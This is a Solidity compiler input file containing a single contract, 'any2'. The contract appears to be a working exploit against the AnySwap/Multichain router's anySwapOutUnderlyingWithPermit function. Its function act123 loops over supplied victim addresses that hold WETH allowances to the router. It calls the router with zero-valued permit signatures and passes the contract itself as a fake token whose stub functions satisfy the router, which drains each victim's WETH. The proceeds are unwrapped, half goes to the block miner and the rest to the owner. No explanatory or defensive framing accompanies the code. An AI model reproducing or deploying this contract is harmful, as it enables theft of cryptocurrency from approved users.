{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "contracts/any2.sol": {
      "content": "pragma solidity 0.6.12;\r\n\r\ninterface IERC20 {\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n}\r\ninterface IAnySwapRouter{\r\n        function anySwapOutUnderlyingWithPermit(\r\n        address from,\r\n        address token,\r\n        address to,\r\n        uint amount,\r\n        uint deadline,\r\n        uint8 v,\r\n        bytes32 r,\r\n        bytes32 s,\r\n        uint toChainID\r\n    ) external ;\r\n}\r\ninterface IWETH {\r\n    function withdraw(uint wad) external ;\r\n}\r\ncontract any2 {\r\n    address payable own;\r\n    address underlyingAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n    uint public percent = 50;\r\n\r\n    receive() external payable {} \r\n    constructor() public{\r\n        own = msg.sender;\r\n    }\r\n    function act123(address[] calldata users) external {\r\n        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n        address anyRouter = 0x6b7a87899490EcE95443e979cA9485CBE7E71522;\r\n        address myToken = address(this);\r\n        bytes32 temp =0x00;\r\n        uint256 beforeBalance= IERC20(weth).balanceOf(myToken);\r\n        \r\n        for(uint i = 0 ; i < users.length; i++){\r\n            uint256 allow = IERC20(weth).allowance(users[i],anyRouter);\r\n            if(allow>0){\r\n                uint balance = IERC20(weth).balanceOf(users[i]);\r\n                if(balance>1e9){\r\n                    IAnySwapRouter(anyRouter).anySwapOutUnderlyingWithPermit(\r\n                        users[i],\r\n                        myToken,\r\n                        own,\r\n                        balance,\r\n                        block.timestamp,\r\n                        0,\r\n                        temp,\r\n                        temp,\r\n                        56\r\n                    );\r\n                }\r\n            }\r\n        }\r\n        uint256 afterBalance= IERC20(weth).balanceOf(myToken);\r\n        require(afterBalance>beforeBalance,\"iedj\");\r\n        \r\n        uint256 toMiner = (afterBalance - beforeBalance)*percent/100;\r\n        IWETH(weth).withdraw(afterBalance - beforeBalance);\r\n        block.coinbase.transfer(toMiner);\r\n        own.transfer(address(this).balance);\r\n\r\n    }\r\n    function wE() external{\r\n        own.transfer(address(this).balance);\r\n    }\r\n    function wT(address t) external{\r\n        IERC20(t).transfer(own,IERC20(t).balanceOf(address(this)));\r\n    }\r\n    function fromHexChar(uint8 c) public pure returns (uint8) {\r\n        if (bytes1(c) >= bytes1('0') && bytes1(c) <= bytes1('9')) {\r\n            return c - uint8(bytes1('0'));\r\n        }\r\n        if (bytes1(c) >= bytes1('a') && bytes1(c) <= bytes1('f')) {\r\n            return 10 + c - uint8(bytes1('a'));\r\n        }\r\n        if (bytes1(c) >= bytes1('A') && bytes1(c) <= bytes1('F')) {\r\n            return 10 + c - uint8(bytes1('A'));\r\n        }\r\n    }\r\n\r\n    // Convert an hexadecimal string to raw bytes\r\n    function fromHex(string memory s) public pure returns (bytes memory) {\r\n        bytes memory ss = bytes(s);\r\n        require(ss.length%2 == 0); // length must be even\r\n        bytes memory r = new bytes(ss.length/2);\r\n        for (uint i=0; i<ss.length/2; ++i) {\r\n            r[i] = bytes1(fromHexChar(uint8(ss[2*i])) * 16 +\r\n                        fromHexChar(uint8(ss[2*i+1])));\r\n        }\r\n        return r;\r\n    }\r\n\r\n    \r\n    function underlying() public returns (address){\r\n        return underlyingAddress;\r\n    }\r\n    function depositVault(uint256 amount,address to) external returns (uint){\r\n        return 1;\r\n    }\r\n    function burn(address from, uint256 amount) external returns (bool){\r\n        return true;\r\n    }\r\n    function setUnderLying(address u) external{\r\n        if(msg.sender==own)\r\n            underlyingAddress = u;\r\n    }\r\n    function setPercent(uint p) external{\r\n        if(msg.sender==own)\r\n            percent = p;\r\n    }\r\n}"
    }
  }
}